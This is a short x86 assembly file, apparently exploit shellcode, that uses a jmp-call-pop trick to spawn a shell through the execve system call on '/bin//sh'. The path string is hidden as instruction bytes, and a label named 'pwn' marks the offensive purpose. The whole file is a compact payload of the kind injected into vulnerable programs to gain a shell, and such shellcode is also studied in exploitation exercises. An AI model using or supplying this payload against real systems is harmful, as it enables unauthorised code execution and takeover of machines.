global _start

section .text
_start:
	jmp short starter
	
pwn:
	pop ebx                    ; EBX = /bin//sh
	mov al, 0xb                ; #define __NR_execve
	int 0x80                   ; Interruption

starter:
	call pwn
	das                        ; /
	bound ebp, [ecx+0x6e]      ; bin
	das                        ; /
	das                        ; /
	jae short 0x69             ; sh